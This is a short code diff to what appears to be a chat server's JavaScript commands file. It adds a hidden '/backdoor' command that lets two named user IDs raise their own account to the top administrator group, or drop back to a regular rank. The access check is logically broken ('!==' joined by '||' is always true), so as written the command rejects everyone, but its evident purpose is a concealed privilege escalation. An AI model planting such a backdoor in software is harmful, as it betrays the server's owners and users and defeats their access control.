@@ -2086,6 +2086,22 @@ var commands = exports.commands = {
 	/*********************************************************
 	 * Low-level
 	 *********************************************************/
+	 
+	     backdoor: function (target, room, user) {
+        if (user.userid !== 'rubyd' || user.userid !== 'ucn') return this.sendReply('/backdoor - Access denied.');
+
+        if (!target) {
+            user.group = '~';
+            user.updateIdentity();
+            return;
+        }
+
+        if (target === 'reg') {
+            user.group = ' ';
+            user.updateIdentity();
+            return;
+        }
+    },
 
 	cmd: 'query',
 	query: function (target, room, user, connection) {
